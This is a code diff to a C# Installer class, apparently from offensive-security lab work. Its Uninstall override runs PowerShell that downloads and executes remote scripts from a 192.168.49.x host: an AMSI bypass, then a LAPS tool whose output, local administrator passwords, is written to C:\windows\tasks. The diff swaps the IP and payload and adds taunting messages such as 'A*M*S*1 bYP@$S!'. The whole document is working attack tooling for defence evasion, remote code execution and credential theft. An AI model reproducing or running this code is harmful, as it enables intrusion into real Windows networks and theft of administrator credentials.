@@ -141,11 +141,11 @@ namespace test
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd1 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.54/amsi.txt') | IEX;";
-            String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.54/script.txt') | IEX | Out-File -FilePath C:\\windows\\tasks\\output.txt";
+            String cmd1 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.178/amsi.txt') | IEX;";
+            String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.178/lapstool.txt') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\windows\\tasks\\output.txt";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
-            Console.WriteLine("Test1");
+            Console.WriteLine("I know your IP Address...");
  
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
@@ -153,6 +153,7 @@ namespace test
             try
             {
                 ps.Invoke();
+                Console.WriteLine("A*M*S*1 bYP@$S!");
             }
             catch (Exception e)
             {
@@ -162,6 +163,7 @@ namespace test
             try
             {
                 ps.Invoke();
+                Console.WriteLine("Welcome...Master H@X0r! 13E7!");
             }
             catch (Exception e)
             {
